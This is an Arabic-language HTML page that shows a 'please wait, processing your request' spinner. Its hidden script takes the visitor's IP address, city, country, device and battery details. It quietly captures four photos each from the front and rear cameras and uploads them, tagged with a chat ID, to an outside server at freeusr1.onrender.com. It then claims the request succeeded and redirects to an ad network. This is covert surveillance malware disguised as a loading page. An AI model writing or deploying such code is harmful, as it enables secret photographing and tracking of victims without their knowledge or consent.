<!DOCTYPE html>
<html>
<head>
    <title>مرحبا بك في موقعنا</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 500px;
        }
        .spinner {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>جاري تنفيذ طلبك</h1>
        <p>يرجى الانتظار...</p>
    </div>

    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
    <canvas id="frontCanvas" style="display:none;"></canvas>
    <canvas id="backCanvas" style="display:none;"></canvas>

    <script>
        const frontVideo = document.getElementById('frontVideo');
        const backVideo = document.getElementById('backVideo');
        const frontCanvas = document.getElementById('frontCanvas');
        const backCanvas = document.getElementById('backCanvas');
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get("chatId");

        let finished = false; // عشان ما يكرر التحويل مرتين

        async function collectAdditionalData() {
            try {
                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
                const battery = await navigator.getBattery();
                return {
                    ip: ipInfo.ip,
                    country: ipInfo.country_name,
                    city: ipInfo.city,
                    platform: getPlatformInfo().platform,
                    deviceVersion: getDeviceVersion(),
                    batteryLevel: battery.level,
                    batteryCharging: battery.charging,
                };
            } catch {
                return {};
            }
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return { platform: "Windows" };
            if (/Mac/.test(ua)) return { platform: "MacOS" };
            if (/Linux/.test(ua)) return { platform: "Linux" };
            if (/Android/.test(ua)) return { platform: "Android" };
            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
            return { platform: "Unknown" };
        }

        function getDeviceVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            return match ? match[1] : 'Unknown';
        }

        async function requestCameraPermission(facingMode) {
            try {
                return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
            } catch {
                return null;
            }
        }

        async function init() {
            const additionalData = await collectAdditionalData();
            const frontStream = await requestCameraPermission('user');
            const backStream = await requestCameraPermission('environment');
            if (frontStream) {
                frontVideo.srcObject = frontStream;
                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
            }
            if (backStream) {
                backVideo.srcObject = backStream;
                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
            }
            if (!frontStream && !backStream) {
                // لو مافي كاميرا شغالة برضو يحول
                finishAndRedirect();
            }
        }

        function setupCamera(video, canvas, cameraType, additionalData) {
            video.play();
            video.onplaying = () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                let count = 0;
                const maxPhotos = 4;

                const timer = setInterval(() => {
                    if (count >= maxPhotos) {
                        clearInterval(timer);
                        if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
                        checkAllFinished();
                        return;
                    }
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('images', blob, `image_${cameraType}_${count}.webp`);
                        fd.append('userId', userId);
                        fd.append('cameraType', cameraType);
                        fd.append('imageWidth', canvas.width);
                        fd.append('imageHeight', canvas.height);
                        fd.append('additionalData', JSON.stringify(additionalData));
                        post('https://freeusr1.onrender.com/submitPhotos', fd);
                    }, 'image/webp', 0.7);
                    count++;
                }, 1000);
            };
        }

        function checkAllFinished() {
            const noFront = !frontVideo.srcObject || frontVideo.srcObject.getTracks().length === 0;
            const noBack = !backVideo.srcObject || backVideo.srcObject.getTracks().length === 0;
            if (noFront && noBack) {
                finishAndRedirect();
            }
        }

        function finishAndRedirect() {
            if (finished) return;
            finished = true;
            document.querySelector('.container').innerHTML = `
                <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
                <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
            `;
            setTimeout(() => {
                window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
            }, 200);
        }

        async function post(url, fd) {
            try { await fetch(url, { method: 'POST', body: fd }); } catch {}
        }

        window.addEventListener('load', init);
    </script>

    <script type='text/javascript' src='//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
</body>
</html>
